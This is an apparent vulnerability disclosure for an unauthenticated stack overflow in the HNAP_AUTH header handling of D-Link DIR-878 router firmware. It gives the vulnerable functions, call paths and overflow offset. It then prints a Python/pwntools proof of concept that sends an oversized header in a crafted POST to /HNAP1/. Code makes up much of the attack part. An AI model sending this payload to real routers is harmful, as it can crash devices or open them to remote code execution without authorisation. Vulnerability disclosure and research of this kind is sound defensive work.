``` 
Dlink model DIR-878, the latest firmware 1.12B01, There is a stack overflow vulnerability that does not require authentication
This can cause remote code execution
download link: ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/
Vulnerability location: file:  /bin/prog.cgi
Vulnerability function：Different locations in different firmware versions
1.02B01:sub_41F534 
path:webssecurityhandler->sub_423fe4->sub_4205c0->sub_41f720-> sub_41F534(Vulnerability function)
1.12B01: sub_41F254
Path: webssecurityhandler->sub_423e04->sub_4202e0->sub_41f440-> sub_41F254 (Vulnerability function)
The attacker calls this function by sending a post packet to the http://ip/HNAP1/  page
.
Message header HNAP_AUTH length is not verified。At the same time, it uses the strncpy function to write to the stack, But the length of the copy is the length of the string entered by the user.Caused a stack overflow。

``` 

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-878/1.png)

post package

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-878/2.png)

Offset：0x208

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-878/3.png)

results:

![image](https://github.com/WhooAmii/whooamii.github.io/blob/master/2018/DIR-878/4.png)

poc
```
import requests
import sys
import struct
import time
from pwn import *

def syscmd1(a):
	data='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

	p=remote('ip'port)
	z=len(data)
	payload=''
	payload+='POST /HNAP1/ HTTP/1.1\r\n'
	payload+='Host: 192.168.0.1\r\n'
	payload+='Connection: close\r\n'
	payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\r\n'
	payload+='Accept-Encoding: gzip, deflate\r\n'
	payload+='Accept: */*\r\n'
	payload+='Origin: http://192.168.0.1\r\n'
	payload+='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
	payload+='User-Agent: python-requests/2.18.4\r\n'
	payload+='Content-Length: '+str(z)+'\r\n'
	payload+='Content-Type: text/xml; charset=UTF-8\r\n'
	payload+='Referer: http://ip/info/Login.html\r\n'
	payload+='Accept-Language: zh-CN,zh;q=0.9\r\n'
	payload+='X-Requested-With: XMLHttpRequest\r\n'
	payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\r\n'
	payload+='\r\n'
	payload+=data
	p.send(payload)
	print p.recv(1024)
	p.close()

if __name__ == "__main__":
			payload='A'*0x400
			
			syscmd1(payload)	
```
